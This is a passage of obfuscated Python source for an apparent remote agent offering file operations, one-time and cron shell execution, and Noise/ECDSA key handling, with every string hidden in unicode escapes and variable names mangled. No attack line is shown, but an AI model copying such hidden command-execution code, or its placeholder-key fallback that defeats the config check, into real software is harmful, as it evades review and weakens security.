    codecs.decode('\\u88f8\\u4e8c\\u8fdb\\u5236\\u6d41\\u4e0a\\u4f20\\u63a5\\u53e3\\u7684\\u6807\\u51c6\\u5316\\u7ed3\\u6784\\u4f53\\u8fd4\\u56de\\u4f53', 'unicode_escape')
    path: Optional[str] = Field(None, description=codecs.decode('\\u6587\\u4ef6\\u5728\\u670d\\u52a1\\u5668\\u7aef\\u7684\\u4fdd\\u5b58\\u8def\\u5f84', 'unicode_escape'))
    chunk_id: Optional[int] = Field(None, description=codecs.decode('\\u5f53\\u524d\\u4e0a\\u4f20\\u7684\\u5206\\u7247\\u7d22\\u5f15', 'unicode_escape'))
    completed: bool = Field(..., description=codecs.decode('\\u6307\\u793a\\u8be5\\u6587\\u4ef6\\u662f\\u5426\\u5df2\\u5168\\u90e8\\u4f20\\u8f93\\u5e76\\u5408\\u5e76\\u5b8c\\u6210', 'unicode_escape'))
    message: str = Field(codecs.decode('', 'unicode_escape'), description=codecs.decode('\\u72b6\\u6001\\u63d0\\u793a\\u6d88\\u606f', 'unicode_escape'))

class FileUploadResponse(SResponse):
    path: Optional[str] = None
    received: Optional[int] = None
    total: Optional[int] = None
    chunked: Optional[bool] = None

class FileDownloadRequest(BaseModel):
    path: str = Field(..., description=codecs.decode('\\u8981\\u4e0b\\u8f7d\\u7684\\u6587\\u4ef6\\u8def\\u5f84', 'unicode_escape'), examples=[codecs.decode('\\u002f\\u0074\\u006d\\u0070\\u002f\\u0062\\u0061\\u0063\\u006b\\u0075\\u0070\\u002e\\u0074\\u0061\\u0072\\u002e\\u0067\\u007a', 'unicode_escape')])

class FileDeleteRequest(BaseModel):
    paths: List[str] = Field(..., description=codecs.decode('\\u8981\\u5220\\u9664\\u7684\\u6587\\u4ef6\\u002f\\u76ee\\u5f55\\u8def\\u5f84\\u5217\\u8868', 'unicode_escape'), examples=[[codecs.decode('\\u002f\\u0074\\u006d\\u0070\\u002f\\u006f\\u006c\\u0064\\u002e\\u006c\\u006f\\u0067', 'unicode_escape'), codecs.decode('\\u002f\\u0074\\u006d\\u0070\\u002f\\u0063\\u0061\\u0063\\u0068\\u0065', 'unicode_escape')]])
    path: Optional[str] = Field(None, exclude=True)
    path2: Optional[str] = Field(None, exclude=True)

class FileDeleteResult(BaseModel):
    path: str
    status: str

class FileDeleteResponse(BaseModel):
    status: str
    results: List[FileDeleteResult]

class FileMoveRequest(BaseModel):
    move_map: Dict[str, str] = Field(..., description=codecs.decode('\\u6e90\\u8def\\u5f84\\u5230\\u76ee\\u6807\\u8def\\u5f84\\u7684\\u6620\\u5c04', 'unicode_escape'), examples=[{codecs.decode('\\u002f\\u0074\\u006d\\u0070\\u002f\\u006f\\u006c\\u0064\\u002e\\u0074\\u0078\\u0074', 'unicode_escape'): codecs.decode('\\u002f\\u0061\\u0072\\u0063\\u0068\\u0069\\u0076\\u0065\\u002f\\u006f\\u006c\\u0064\\u002e\\u0074\\u0078\\u0074', 'unicode_escape'), codecs.decode('\\u002f\\u0074\\u006d\\u0070\\u002f\\u006c\\u006f\\u0067\\u0073', 'unicode_escape'): codecs.decode('\\u002f\\u0062\\u0061\\u0063\\u006b\\u0075\\u0070\\u002f\\u006c\\u006f\\u0067\\u0073', 'unicode_escape')}])
    path: Optional[str] = Field(None, exclude=True)
    mvpath: Optional[str] = Field(None, exclude=True)

class FileMoveResult(BaseModel):
    from_field: str = Field(..., alias=codecs.decode('\\u0066\\u0072\\u006f\\u006d', 'unicode_escape'))
    to: str
    status: str
    model_config = ConfigDict(populate_by_name=True)

class FileMoveResponse(BaseModel):
    status: str
    total: int
    success: int
    results: List[Dict[str, str]]

class FileMkdirRequest(BaseModel):
    path: str = Field(..., description=codecs.decode('\\u8981\\u521b\\u5efa\\u7684\\u65b0\\u76ee\\u5f55\\u8def\\u5f84', 'unicode_escape'), examples=[codecs.decode('\\u002f\\u0074\\u006d\\u0070\\u002f\\u006e\\u0065\\u0077\\u002f\\u0070\\u0072\\u006f\\u006a\\u0065\\u0063\\u0074\\u002f\\u006c\\u006f\\u0067\\u0073', 'unicode_escape')])

class FileMkdirResponse(BaseModel):
    status: str
    path: str

class OneTimeTaskGetResponse(BaseModel):
    status: str = Field(codecs.decode('\\u006f\\u006b', 'unicode_escape'), description=codecs.decode('\\u8bf7\\u6c42\\u72b6\\u6001', 'unicode_escape'), examples=[codecs.decode('\\u006f\\u006b', 'unicode_escape')])
    count: int = Field(..., description=codecs.decode('\\u5f85\\u6267\\u884c\\u4efb\\u52a1\\u7684\\u6570\\u91cf', 'unicode_escape'), examples=[2])
    tasks: List[str] = Field(..., description=codecs.decode('\\u5f85\\u6267\\u884c\\u7684\\u4efb\\u52a1\\u547d\\u4ee4\\u5217\\u8868', 'unicode_escape'), examples=[[codecs.decode('\\u0065\\u0063\\u0068\\u006f\\u0020\\u0027\\u0069\\u006e\\u0069\\u0074\\u0027', 'unicode_escape'), codecs.decode('\\u002f\\u006f\\u0070\\u0074\\u002f\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u0073\\u002f\\u0073\\u0065\\u0074\\u0075\\u0070\\u002e\\u0073\\u0068', 'unicode_escape')]])

class OneTimeTaskRequest(RootModel):
    root: List[str]

class OneTimeTaskResponse(CountResponse):
    tasks: List[str]
    executed: Optional[List[Any]] = None

class CronTasksResponse(CountResponse):
    tasks: Dict[str, str] = Field(..., description=codecs.decode('\\u0043\\u0072\\u006f\\u006e\\u8868\\u8fbe\\u5f0f\\u4e0e\\u547d\\u4ee4\\u7684\\u6620\\u5c04\\u5b57\\u5178', 'unicode_escape'), examples=[{codecs.decode('\\u002a\\u002f\\u0031\\u0030\\u0020\\u002a\\u0020\\u002a\\u0020\\u002a\\u0020\\u002a', 'unicode_escape'): codecs.decode('\\u0070\\u0079\\u0074\\u0068\\u006f\\u006e\\u0020\\u002f\\u006f\\u0070\\u0074\\u002f\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u0073\\u002f\\u0068\\u0065\\u0061\\u006c\\u0074\\u0068\\u005f\\u0063\\u0068\\u0065\\u0063\\u006b\\u002e\\u0070\\u0079', 'unicode_escape')}])

class BaseLogEntry(BaseModel):
    ts: str = Field(..., description=codecs.decode('\\u6267\\u884c\\u65f6\\u95f4\\u6233', 'unicode_escape'), examples=[codecs.decode('\\u0032\\u0030\\u0032\\u0034\\u002d\\u0030\\u0031\\u002d\\u0031\\u0035\\u0054\\u0031\\u0030\\u003a\\u0033\\u0030\\u003a\\u0034\\u0035\\u005a', 'unicode_escape')])
    cmd: str = Field(..., description=codecs.decode('\\u6267\\u884c\\u7684\\u547d\\u4ee4', 'unicode_escape'))
    output: str = Field(..., description=codecs.decode('\\u547d\\u4ee4\\u8f93\\u51fa\\u5185\\u5bb9', 'unicode_escape'))
    exitcode: int = Field(..., description=codecs.decode('\\u9000\\u51fa\\u7801', 'unicode_escape'))
    type: str = Field(..., description=codecs.decode('\\u65e5\\u5fd7\\u7c7b\\u578b', 'unicode_escape'))
    formatted: Optional[str] = Field(None, description=codecs.decode('\\u683c\\u5f0f\\u5316\\u540e\\u7684\\u6458\\u8981', 'unicode_escape'))

class CronLogEntry(BaseLogEntry):
    cron: str = Field(..., description=codecs.decode('\\u0043\\u0072\\u006f\\u006e\\u0020\\u8868\\u8fbe\\u5f0f', 'unicode_escape'), examples=[codecs.decode('\\u002a\\u002f\\u0035\\u0020\\u002a\\u0020\\u002a\\u0020\\u002a\\u0020\\u002a', 'unicode_escape')])

class TaskLogResponse(CountResponse):
    logs: List[Any]

class LogClearResponse(SResponse):
    cleared: str = Field(..., description=codecs.decode('\\u88ab\\u6e05\\u7a7a\\u7684\\u65e5\\u5fd7\\u7c7b\\u578b', 'unicode_escape'), examples=[codecs.decode('\\u006f\\u006e\\u0065\\u0074\\u0069\\u006d\\u0065', 'unicode_escape'), codecs.decode('\\u0063\\u0072\\u006f\\u006e', 'unicode_escape')])

class LogStats(BaseModel):
    total_logged: int
    max_capacity: int
    recent_success: int
    recent_failed: int

class LogSummaryResponse(BaseModel):
    onetime: LogStats
    cron: LogStats

class OnetimeStatus(BaseModel):
    pending: bool = Field(..., description=codecs.decode('\\u662f\\u5426\\u6709\\u5f85\\u6267\\u884c\\u7684\\u4efb\\u52a1', 'unicode_escape'), examples=[False])
    count: int = Field(..., description=codecs.decode('\\u5f85\\u6267\\u884c\\u4efb\\u52a1\\u6570\\u91cf', 'unicode_escape'), examples=[3])

class CronStatus(BaseModel):
    active: bool = Field(..., description=codecs.decode('\\u5b9a\\u65f6\\u4efb\\u52a1\\u8c03\\u5ea6\\u5668\\u662f\\u5426\\u5904\\u4e8e\\u6d3b\\u8dc3\\u72b6\\u6001', 'unicode_escape'), examples=[True])
    count: int = Field(..., description=codecs.decode('\\u5f53\\u524d\\u914d\\u7f6e\\u7684\\u5b9a\\u65f6\\u4efb\\u52a1\\u6570\\u91cf', 'unicode_escape'), examples=[2])
    check_interval: int = Field(..., description=codecs.decode('\\u68c0\\u67e5\\u95f4\\u9694\\u0028\\u79d2\\u0029', 'unicode_escape'), examples=[30])

class TaskStatusResponse(BaseModel):
    onetime: OnetimeStatus
    cron: CronStatus

class OnetimeExecuteResponse(BaseModel):
    status: str = Field(codecs.decode('\\u006f\\u006b', 'unicode_escape'), examples=[codecs.decode('\\u006f\\u006b', 'unicode_escape')])
    message: Optional[str] = Field(None, description=codecs.decode('\\u72b6\\u6001\\u8bf4\\u660e', 'unicode_escape'))
    executed: int = Field(..., description=codecs.decode('\\u6210\\u529f\\u89e6\\u53d1\\u7684\\u4efb\\u52a1\\u6570\\u91cf', 'unicode_escape'), examples=[2])
    results: List[Dict[str, Any]] = Field(..., description=codecs.decode('\\u6bcf\\u4e2a\\u4efb\\u52a1\\u7684\\u8be6\\u7ec6\\u6267\\u884c\\u7ed3\\u679c', 'unicode_escape'), examples=[[{codecs.decode('\\u0063\\u006d\\u0064', 'unicode_escape'): codecs.decode('\\u0065\\u0063\\u0068\\u006f\\u0020\\u0027\\u0068\\u0065\\u006c\\u006c\\u006f\\u0027', 'unicode_escape'), codecs.decode('\\u0065\\u0078\\u0069\\u0074\\u0063\\u006f\\u0064\\u0065', 'unicode_escape'): 0, codecs.decode('\\u0073\\u0074\\u0064\\u006f\\u0075\\u0074', 'unicode_escape'): codecs.decode('\\u0068\\u0065\\u006c\\u006c\\u006f\\u000a', 'unicode_escape'), codecs.decode('\\u0073\\u0074\\u0064\\u0065\\u0072\\u0072', 'unicode_escape'): codecs.decode('', 'unicode_escape')}]])
_BASE_DIR = os.path.dirname(os.path.abspath(__file__))

def _get_config_value(key: str, default: str=codecs.decode('', 'unicode_escape'), file_path: str=None) -> str:
    O0_var_27 = os.getenv(key)
    if O0_var_27 is not None:
        return O0_var_27.strip()
    if file_path:
        O0_var_28 = os.path.join(_BASE_DIR, file_path)
        if os.path.exists(O0_var_28):
            try:
                with open(O0_var_28, codecs.decode('\\u0072', 'unicode_escape'), encoding=codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape')) as O0_var_29:
                    O0_var_30 = O0_var_29.read().strip()
                    if O0_var_30:
                        return O0_var_30
            except Exception:
                pass
    return default.strip() if default else codecs.decode('', 'unicode_escape')

@dataclass
class NoiseKeypair:
    codecs.decode('\\u004e\\u006f\\u0069\\u0073\\u0065\\u0020\\u534f\\u8bae\\u5bc6\\u94a5\\u5bf9\\u6570\\u636e\\u7c7b', 'unicode_escape')
    role: str
    private_b64: str
    public_b64: str

    def to_dict(self) -> Dict[str, str]:
        return asdict(self)

    @property
    def private_bytes(self) -> bytes:
        return base64.b64decode(self.private_b64)

    @property
    def public_bytes(self) -> bytes:
        return base64.b64decode(self.public_b64)

class NoiseKeyGenerator:
    codecs.decode('\\u000a\\u0020\\u0020\\u0020\\u0020\\u004e\\u006f\\u0069\\u0073\\u0065\\u0020\\u0050\\u0072\\u006f\\u0074\\u006f\\u0063\\u006f\\u006c\\u0020\\u0058\\u0032\\u0035\\u0035\\u0031\\u0039\\u0020\\u5bc6\\u94a5\\u5bf9\\u751f\\u6210\\u5668\\u000a\\u0020\\u0020\\u0020\\u0020\\u000a\\u0020\\u0020\\u0020\\u0020\\u751f\\u6210\\u7b26\\u5408\\u0020\\u006e\\u006f\\u0069\\u0073\\u0065\\u002d\\u0063\\u0020\\u002f\\u0020\\u006e\\u006f\\u0069\\u0073\\u0065\\u0070\\u0072\\u006f\\u0074\\u006f\\u0063\\u006f\\u006c\\u0020\\u6807\\u51c6\\u7684\\u0020\\u0033\\u0032\\u0020\\u5b57\\u8282\\u0020\\u0052\\u0061\\u0077\\u0020\\u683c\\u5f0f\\u5bc6\\u94a5\\u000a\\u0020\\u0020\\u0020\\u0020', 'unicode_escape')
    KEY_SIZE = 32
    ENCODING = serialization.Encoding.Raw
    PRIVATE_FORMAT = serialization.PrivateFormat.Raw
    PUBLIC_FORMAT = serialization.PublicFormat.Raw

    @staticmethod
    def _generate_raw_keypair() -> Tuple[bytes, bytes]:
        O0_var_31 = x25519.X25519PrivateKey.generate()
        O0_var_32 = O0_var_31.public_key()
        O0_var_33 = O0_var_31.private_bytes(encoding=NoiseKeyGenerator.ENCODING, format=NoiseKeyGenerator.PRIVATE_FORMAT, encryption_algorithm=serialization.NoEncryption())
        O0_var_34 = O0_var_32.public_bytes(encoding=NoiseKeyGenerator.ENCODING, format=NoiseKeyGenerator.PUBLIC_FORMAT)
        assert len(O0_var_33) == NoiseKeyGenerator.KEY_SIZE
        assert len(O0_var_34) == NoiseKeyGenerator.KEY_SIZE
        return (O0_var_33, O0_var_34)

    @classmethod
    def generate_single(cls, role_name: str) -> NoiseKeypair:
        O0_var_35, O0_var_36 = cls._generate_raw_keypair()
        return NoiseKeypair(role=role_name, private_b64=base64.b64encode(O0_var_35).decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape')), public_b64=base64.b64encode(O0_var_36).decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape')))

    @classmethod
    def generate_pair(cls, control_role: str=codecs.decode('\\u0043\\u006f\\u006e\\u0074\\u0072\\u006f\\u006c\\u006c\\u0065\\u0072', 'unicode_escape'), agent_role: str=codecs.decode('\\u0041\\u0067\\u0065\\u006e\\u0074', 'unicode_escape')) -> Dict[str, NoiseKeypair]:
        return {codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0072\\u006f\\u006c', 'unicode_escape'): cls.generate_single(control_role), codecs.decode('\\u0061\\u0067\\u0065\\u006e\\u0074', 'unicode_escape'): cls.generate_single(agent_role)}

class Config:
    codecs.decode('\\u000a\\u0020\\u0020\\u0020\\u0020\\u914d\\u7f6e\\u4e2d\\u5fc3\\u0020\\u002d\\u0020\\u652f\\u6301\\u591a\\u7ea7\\u914d\\u7f6e\\u6e90\\u000a\\u0020\\u0020\\u0020\\u0020\\u4f18\\u5148\\u7ea7\\u003a\\u0020\\u73af\\u5883\\u53d8\\u91cf\\u0020\\u003e\\u0020\\u672c\\u5730\\u6587\\u4ef6\\u0020\\u003e\\u0020\\u9ed8\\u8ba4\\u503c\\u000a\\u0020\\u0020\\u0020\\u0020', 'unicode_escape')
    Rtimeout = int(os.getenv(codecs.decode('\\u0045\\u0058\\u0045\\u0043\\u005f\\u0054\\u0049\\u004d\\u0045\\u004f\\u0055\\u0054', 'unicode_escape'), codecs.decode('\\u0033\\u0030', 'unicode_escape')))
    EXEC_SHELL_MODE = os.getenv(codecs.decode('\\u0045\\u0058\\u0045\\u0043\\u005f\\u0053\\u0048\\u0045\\u004c\\u004c', 'unicode_escape'), codecs.decode('\\u0074\\u0072\\u0075\\u0065', 'unicode_escape')).lower() == codecs.decode('\\u0074\\u0072\\u0075\\u0065', 'unicode_escape')
    DEBUG = os.getenv(codecs.decode('\\u0044\\u0045\\u0042\\u0055\\u0047', 'unicode_escape'), codecs.decode('\\u0066\\u0061\\u006c\\u0073\\u0065', 'unicode_escape')).lower() == codecs.decode('\\u0074\\u0072\\u0075\\u0065', 'unicode_escape')
    TIMESTAMP_WINDOW = int(os.getenv(codecs.decode('\\u0054\\u0049\\u004d\\u0045\\u0053\\u0054\\u0041\\u004d\\u0050\\u005f\\u0057\\u0049\\u004e\\u0044\\u004f\\u0057', 'unicode_escape'), codecs.decode('\\u0033\\u0036\\u0030\\u0030', 'unicode_escape')))
    ECDSA_PUBLIC_KEY_PEM = _get_config_value(key=codecs.decode('\\u0045\\u0043\\u0044\\u0053\\u0041\\u005f\\u0050\\u0055\\u0042\\u004b\\u0045\\u0059', 'unicode_escape'), file_path=codecs.decode('\\u006b\\u0065\\u0079\\u0073\\u002f\\u0061\\u0067\\u0065\\u006e\\u0074\\u005f\\u0065\\u0063\\u0064\\u0073\\u0061\\u005f\\u0070\\u0075\\u0062\\u002e\\u0070\\u0065\\u006d', 'unicode_escape')) or codecs.decode('\\u0045\\u0043\\u0044\\u0053\\u0041\\u516c\\u94a5\\u5185\\u5bb9', 'unicode_escape')
    ECIES_PUBLIC_KEY_PEM = _get_config_value(key=codecs.decode('\\u0045\\u0043\\u0049\\u0045\\u0053\\u005f\\u0050\\u0055\\u0042\\u004b\\u0045\\u0059', 'unicode_escape'), file_path=codecs.decode('\\u006b\\u0065\\u0079\\u0073\\u002f\\u0061\\u0067\\u0065\\u006e\\u0074\\u005f\\u0065\\u0063\\u0069\\u0065\\u0073\\u005f\\u0070\\u0075\\u0062\\u002e\\u0062\\u0036\\u0034', 'unicode_escape')) or codecs.decode('\\u0045\\u0043\\u0049\\u0045\\u0053\\u516c\\u94a5\\u5185\\u5bb9', 'unicode_escape')
    _raw_key = get_random_bytes(32)
    SESSION_KEY = base64.b64encode(_raw_key).decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'))
    keys = NoiseKeyGenerator.generate_pair()
    NOISE_KEY = {codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0072\\u006f\\u006c\\u006c\\u0065\\u0072', 'unicode_escape'): {codecs.decode('\\u0070\\u0072\\u0069\\u0076\\u0061\\u0074\\u0065', 'unicode_escape'): keys[codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0072\\u006f\\u006c', 'unicode_escape')].private_b64}, codecs.decode('\\u0061\\u0067\\u0065\\u006e\\u0074', 'unicode_escape'): {codecs.decode('\\u0070\\u0075\\u0062\\u006c\\u0069\\u0063', 'unicode_escape'): keys[codecs.decode('\\u0061\\u0067\\u0065\\u006e\\u0074', 'unicode_escape')].public_b64}}

    @staticmethod
    def ws_downgrade_token() -> str:
        O0_var_37 = base64.b64decode(Config.SESSION_KEY)
        O0_var_38 = hmac.new(O0_var_37, b'kisama-ws-token-v1', hashlib.sha256).digest()
        return base64.b64encode(O0_var_38).decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'))

    @classmethod
    def rotate_operational_secrets(cls):
        O0_var_39 = NoiseKeyGenerator.generate_pair()
        cls.keys[codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0072\\u006f\\u006c', 'unicode_escape')] = O0_var_39[codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0072\\u006f\\u006c', 'unicode_escape')]
        cls.NOISE_KEY[codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0072\\u006f\\u006c\\u006c\\u0065\\u0072', 'unicode_escape')][codecs.decode('\\u0070\\u0072\\u0069\\u0076\\u0061\\u0074\\u0065', 'unicode_escape')] = O0_var_39[codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0072\\u006f\\u006c', 'unicode_escape')].private_b64
        cls._raw_key = get_random_bytes(32)
        cls.SESSION_KEY = base64.b64encode(cls._raw_key).decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'))
        cls._baseinfo_cache = None
        cls._baseinfo_cache_time = 0.0
        cls._status_cache = None
        cls._status_cache_time = 0.0
        Logger.warning(codecs.decode('\\U0001f504\\u0020\\u005b\\u0053\\u0045\\u0043\\u0055\\u0052\\u0049\\u0054\\u0059\\u005d\\u0020\\u4e34\\u65f6\\u5bc6\\u94a5\\u8fc7\\u671f\\u002c\\u0020\\u5df2\\u8f6e\\u6362\\u0020\\u0053\\u0045\\u0053\\u0053\\u0049\\u004f\\u004e\\u005f\\u004b\\u0045\\u0059\\u0020\\u4e0e\\u63a7\\u5236\\u7aef\\u0020\\u004e\\u006f\\u0069\\u0073\\u0065\\u0020\\u5bc6\\u94a5\\u5bf9\\u0020\\u0028\\u5408\\u6cd5\\u63a7\\u5236\\u7aef\\u9700\\u91cd\\u65b0\\u8ba4\\u8bc1\\u83b7\\u53d6\\u0020\\u0062\\u0061\\u0073\\u0065\\u0069\\u006e\\u0066\\u006f\\u0020\\u65b0\\u5bc6\\u94a5\\u0029', 'unicode_escape'))
    FILE_ROOT = _resolve_safe_file_root()
    MAX_UPLOAD_SIZE = int(os.getenv(codecs.decode('\\u004d\\u0041\\u0058\\u005f\\u0055\\u0050\\u004c\\u004f\\u0041\\u0044\\u005f\\u0053\\u0049\\u005a\\u0045', 'unicode_escape'), codecs.decode('\\u0031\\u0030\\u0034\\u0038\\u0035\\u0037\\u0036\\u0030\\u0030', 'unicode_escape')))
    FOLLOW_SYMLINKS = os.getenv(codecs.decode('\\u0046\\u004f\\u004c\\u004c\\u004f\\u0057\\u005f\\u0053\\u0059\\u004d\\u004c\\u0049\\u004e\\u004b\\u0053', 'unicode_escape'), codecs.decode('\\u0066\\u0061\\u006c\\u0073\\u0065', 'unicode_escape')).lower() == codecs.decode('\\u0074\\u0072\\u0075\\u0065', 'unicode_escape')
    FILE_AUDIT_LOG = os.getenv(codecs.decode('\\u0046\\u0049\\u004c\\u0045\\u005f\\u0041\\u0055\\u0044\\u0049\\u0054\\u005f\\u004c\\u004f\\u0047', 'unicode_escape'), codecs.decode('\\u0074\\u0072\\u0075\\u0065', 'unicode_escape')).lower() == codecs.decode('\\u0074\\u0072\\u0075\\u0065', 'unicode_escape')
    InitTask: bool = True
    onetasks: List[str] = []
    crontasks: Dict[str, str] = {}
    cronloop: bool = False
    TASK_TIMEOUT = int(os.getenv(codecs.decode('\\u0054\\u0041\\u0053\\u004b\\u005f\\u0054\\u0049\\u004d\\u0045\\u004f\\u0055\\u0054', 'unicode_escape'), codecs.decode('\\u0033\\u0030\\u0030', 'unicode_escape')))
    CRON_CHECK_INTERVAL = int(os.getenv(codecs.decode('\\u0043\\u0052\\u004f\\u004e\\u005f\\u0049\\u004e\\u0054\\u0045\\u0052\\u0056\\u0041\\u004c', 'unicode_escape'), codecs.decode('\\u0033\\u0030', 'unicode_escape')))
    onetimetasks_log: List[Dict[str, Any]] = []
    crontasks_log: List[Dict[str, Any]] = []
    MAX_TASK_LOG_SIZE = int(os.getenv(codecs.decode('\\u004d\\u0041\\u0058\\u005f\\u0054\\u0041\\u0053\\u004b\\u005f\\u004c\\u004f\\u0047', 'unicode_escape'), codecs.decode('\\u0031\\u0030\\u0030', 'unicode_escape')))
    TEMPKEY_DEFAULT_TTL_HOURS = int(os.getenv(codecs.decode('\\u0054\\u0045\\u004d\\u0050\\u004b\\u0045\\u0059\\u005f\\u0054\\u0054\\u004c', 'unicode_escape'), codecs.decode('\\u0032\\u0034', 'unicode_escape')))
    TEMPKEY_MAX_TTL_HOURS = int(os.getenv(codecs.decode('\\u0054\\u0045\\u004d\\u0050\\u004b\\u0045\\u0059\\u005f\\u004d\\u0041\\u0058\\u005f\\u0054\\u0054\\u004c', 'unicode_escape'), codecs.decode('\\u0031\\u0036\\u0038', 'unicode_escape')))
    BASEINFO_CACHE_TTL = 3600
    STATUS_CACHE_TTL = 30
    _baseinfo_cache: Optional[Dict[str, Any]] = None
    _baseinfo_cache_time: float = 0.0
    _baseinfo_lock: Optional[asyncio.Lock] = None
    _status_cache: Optional[Dict[str, Any]] = None
    _status_cache_time: float = 0.0
    _status_lock: Optional[asyncio.Lock] = None
    HOST = os.getenv(codecs.decode('\\u0048\\u004f\\u0053\\u0054', 'unicode_escape'), codecs.decode('\\u0030\\u002e\\u0030\\u002e\\u0030\\u002e\\u0030', 'unicode_escape'))
    PORT = int(os.getenv(codecs.decode('\\u004b\\u0050\\u004f\\u0052\\u0054', 'unicode_escape')) or os.getenv(codecs.decode('\\u0050\\u004f\\u0052\\u0054', 'unicode_escape')) or os.environ.get(codecs.decode('\\u0053\\u0045\\u0052\\u0056\\u0045\\u0052\\u005f\\u0050\\u004f\\u0052\\u0054', 'unicode_escape')) or 8000)
    KMODE = os.getenv(codecs.decode('\\u004b\\u004d\\u004f\\u0044\\u0045', 'unicode_escape'), codecs.decode('\\u0030', 'unicode_escape')).strip() or codecs.decode('\\u0030', 'unicode_escape')
    KNAME = os.getenv(codecs.decode('\\u004b\\u004e\\u0041\\u004d\\u0045', 'unicode_escape'), codecs.decode('', 'unicode_escape')).strip()
    KNAME_KEY = os.getenv(codecs.decode('\\u004b\\u004e\\u0041\\u004d\\u0045\\u005f\\u004b\\u0045\\u0059', 'unicode_escape'), codecs.decode('', 'unicode_escape')).strip()
    KPATH = os.getenv(codecs.decode('\\u004b\\u0050\\u0041\\u0054\\u0048', 'unicode_escape'), codecs.decode('', 'unicode_escape'))
    AGENT_VERSION = os.getenv(codecs.decode('\\u0041\\u0047\\u0045\\u004e\\u0054\\u005f\\u0056\\u0045\\u0052\\u0053\\u0049\\u004f\\u004e', 'unicode_escape'), codecs.decode('\\u0030\\u002e\\u0034\\u002e\\u0038\\u002d\\u0070\\u0079\\u0074\\u0068\\u006f\\u006e', 'unicode_escape'))

    @classmethod
    def validate(cls):
        if not cls.DEBUG:
            O0_var_40 = []
            if not cls.ECDSA_PUBLIC_KEY_PEM:
                O0_var_40.append(codecs.decode('\\u0045\\u0043\\u0044\\u0053\\u0041\\u005f\\u0050\\u0055\\u0042\\u004b\\u0045\\u0059\\u003a\\u0020\\u672a\\u8bbe\\u7f6e\\u73af\\u5883\\u53d8\\u91cf\\u4e14\\u6587\\u4ef6\\u0020\\u006b\\u0065\\u0079\\u0073\\u002f\\u0061\\u0067\\u0065\\u006e\\u0074\\u005f\\u0065\\u0063\\u0064\\u0073\\u0061\\u005f\\u0070\\u0075\\u0062\\u002e\\u0070\\u0065\\u006d\\u0020\\u4e0d\\u5b58\\u5728', 'unicode_escape'))
            else:
                try:
                    CryptoManager._load_ecdsa_pubkey(cls.ECDSA_PUBLIC_KEY_PEM)
                except Exception as e:
                    O0_var_40.append(codecs.decode('\\u0045\\u0043\\u0044\\u0053\\u0041\\u005f\\u0050\\u0055\\u0042\\u004b\\u0045\\u0059\\u0020\\u0069\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u003a\\u0020', 'unicode_escape') + str(e))
            if not cls.ECIES_PUBLIC_KEY_PEM:
                O0_var_40.append(codecs.decode('\\u0045\\u0043\\u0049\\u0045\\u0053\\u005f\\u0050\\u0055\\u0042\\u004b\\u0045\\u0059\\u003a\\u0020\\u672a\\u8bbe\\u7f6e\\u73af\\u5883\\u53d8\\u91cf\\u4e14\\u6587\\u4ef6\\u0020\\u006b\\u0065\\u0079\\u0073\\u002f\\u0061\\u0067\\u0065\\u006e\\u0074\\u005f\\u0065\\u0063\\u0069\\u0065\\u0073\\u005f\\u0070\\u0075\\u0062\\u002e\\u0062\\u0036\\u0034\\u0020\\u4e0d\\u5b58\\u5728', 'unicode_escape'))
            else:
                try:
                    CryptoManager.validate_ecies_pubkey(cls.ECIES_PUBLIC_KEY_PEM)
                except Exception as e:
                    O0_var_40.append(codecs.decode('\\u0045\\u0043\\u0049\\u0045\\u0053\\u005f\\u0050\\u0055\\u0042\\u004b\\u0045\\u0059\\u0020\\u0069\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u003a\\u0020', 'unicode_escape') + str(e))
            if O0_var_40:
                Logger.error(codecs.decode('\\u274c\\u0020\\u914d\\u7f6e\\u6821\\u9a8c\\u5931\\u8d25\\u0020\\u0028\\u975e\\u0044\\u0045\\u0042\\u0055\\u0047\\u6a21\\u5f0f\\u5fc5\\u987b\\u914d\\u7f6e\\u5bc6\\u94a5\\u0029\\u003a', 'unicode_escape'))
                for O0_var_41 in O0_var_40:
                    Logger.error(codecs.decode('\\u0020\\u0020\\u0020\\u2022\\u0020', 'unicode_escape') + str(O0_var_41))
                Logger.info(codecs.decode('\\u000a\\U0001f4a1\\u0020\\u89e3\\u51b3\\u65b9\\u6cd5\\u003a', 'unicode_escape'))
                Logger.info(codecs.decode('\\u0020\\u0020\\u0020\\u0031\\u002e\\u0020\\u8bbe\\u7f6e\\u73af\\u5883\\u53d8\\u91cf\\u003a\\u0020\\u0065\\u0078\\u0070\\u006f\\u0072\\u0074\\u0020\\u0045\\u0043\\u0044\\u0053\\u0041\\u005f\\u0050\\u0055\\u0042\\u004b\\u0045\\u0059\\u003d\\u0027\\u002d\\u002d\\u002d\\u002d\\u002d\\u0042\\u0045\\u0047\\u0049\\u004e\\u0020\\u0050\\u0055\\u0042\\u004c\\u0049\\u0043\\u0020\\u004b\\u0045\\u0059\\u002d\\u002d\\u002d\\u002d\\u002d\\u002e\\u002e\\u002e\\u0027', 'unicode_escape'))
                Logger.info(codecs.decode('\\u0020\\u0020\\u0020\\u0032\\u002e\\u0020\\u6216\\u5c06\\u5bc6\\u94a5\\u6587\\u4ef6\\u653e\\u5165\\u0020\\u002e\\u002f\\u006b\\u0065\\u0079\\u0073\\u002f\\u0020\\u76ee\\u5f55\\u0020\\u0028\\u8fd0\\u884c\\u0020\\u0067\\u0065\\u006e\\u0065\\u0072\\u0061\\u0074\\u0065\\u005f\\u006b\\u0065\\u0079\\u0073\\u002e\\u0070\\u0079\\u0020\\u751f\\u6210\\u0029', 'unicode_escape'))
                sys.exit(1)

